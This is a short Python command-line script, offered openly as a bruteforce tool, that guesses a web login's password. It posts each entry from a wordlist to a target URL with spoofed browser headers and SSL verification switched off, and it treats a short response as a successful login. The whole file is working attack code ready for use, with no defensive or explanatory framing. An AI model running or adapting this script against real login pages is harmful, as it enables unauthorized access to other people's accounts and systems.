import requests
import argparse

requests.packages.urllib3.disable_warnings() # Disable SSL warnings

# Take login and passwords file in arguments
parser = argparse.ArgumentParser(description='Bruteforce script')
parser.add_argument('--login', type=str, dest='login', required=True,
                    help='Username to bruteforce')
parser.add_argument('--pass', dest='passpath', required=True,
                    help='Path to file containing passwords to test, one per line.')
parser.add_argument('--url', dest='url', required=True,
                    help='URL to bruteforce')
parser.add_argument('--referrer', dest='referrer', required=False,
                    help='Referrer URL, not mandatory')
args = parser.parse_args()

# Get login and password list
login = args.login
passpath = args.passpath

passfile = open(passpath, "r")
passwords = passfile.read().splitlines()
passfile.close()

referrer = args.referrer

# Set mandatory headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Referer": referrer,
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "close",
}

# Set URL
url = args.url

# Set base payload
base = f'login={login}&mdp='


print(f'\n\n--------------------------------------\nStarting bruteforce of user admin at {url}')
for i, p in enumerate(passwords):
    payload = base + p

    # Post request
    r = requests.post(url, verify=False, data=payload, headers=headers)
    if len(r.text) < 3000: # Simply detect successful login based on response length
        print(f'Bruteforce successful at {i}-th attempt. Password : {p}')
        break